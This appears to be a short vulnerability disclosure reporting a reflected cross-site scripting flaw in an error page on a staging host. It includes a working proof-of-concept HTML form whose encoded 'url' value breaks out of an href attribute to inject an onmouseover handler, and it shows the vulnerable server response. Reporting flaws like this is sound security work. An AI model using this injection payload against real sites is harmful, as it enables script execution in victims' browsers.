Summary:

hey

the error message generated can be used to escape out of a dynamically generated href link. The below will render in internet explorer (without xss filter enabled of course). See the screenshot for an example.


<html>
  <body>
    <form action="http://staging.fct.li/" method="POST">
      <input type="hidden" name="url" value="unana&apos;&#32;onmouseover&#61;alert&#40;1&#41;&#32;some&#61;&apos;na&#46;google&#46;de" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>


The response is:
    HTTP/1.1 504 Gateway Time-out
    Server: nginx/1.4.4
    Date: Wed, 02 Jul 2014 18:13:51 GMT

    This page is taking unusually long to load. You can try visiting the site without Factlink: <a href='http://unana' onmouseover=alert(1) some='na.google.de/'>http://unana' onmouseover=alert(1) some='na.google.de/</a>


Because of the "onmouseover" event waiting for its trigger you need to move your mouse over the link ...
